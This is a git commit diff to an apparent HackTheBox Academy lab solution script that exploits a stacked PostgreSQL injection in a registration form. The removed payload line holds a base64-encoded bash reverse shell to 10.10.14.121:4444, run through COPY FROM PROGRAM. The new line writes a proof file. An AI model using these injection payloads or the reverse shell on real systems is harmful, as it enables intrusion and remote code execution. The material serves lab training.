e1c153bcc719dc92994b3b941880a95e744f94ef
Adam Rose <93153300+AdamRose1@users.noreply.github.com>
2025-01-29 07:47:25 -0500

    Update Advanced_SQL_Injections-Reading_and_Writing_Files.py

--- HackTheBox-Writeups/HTBAcademy: POC-Scripts/Advanced_SQL_Injections-Reading_and_Writing_Files.py
+++ HackTheBox-Writeups/HTBAcademy: POC-Scripts/Advanced_SQL_Injections-Reading_and_Writing_Files.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 """Created this script to solve the HackTheBox Academy lab called 'Reading and Writing Files' for the module called 'Advanced SQL Injections'. 
-This script exploits a blind postgreSQL injection to get a reverse shell.
+This script exploits a blind stacked postgreSQL injection to write a file on the target server.
 Open a netcat listener for port 4444 before running the script
 """
 
@@ -21,7 +21,7 @@ def generate_random_word():
 random_group = generate_random_word()
    
 # Update the IP address in the base64 string before running the script.
-payload=f"create+table+{random_group}(mycol+text);Insert+into+{random_group}+values+($$echo+-n+YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIxLzQ0NDQgMD4mMSAi|base64+-d|bash$$);COPY+{random_group}+TO+'/var/lib/postgresql/proof.txt';COPY+{random_group}+TO+'/tmp/atest.sh';copy+{random_group}+FROM+program+'chmod+777+/tmp/atest.sh';copy+{random_group}+from+program+'/tmp/atest.sh'"
+payload=f"create+table+{random_group}(mycol+text);Insert+into+{random_group}+values+($$testing$$);COPY+{random_group}+TO+'/var/lib/postgresql/proof.txt';"
 
 data= f"name={random_group}&username={random_group}','{random_group}@test.com','afda');{payload};--+-&email={random_group}@a.com&password=test&repeatPassword=test"
 
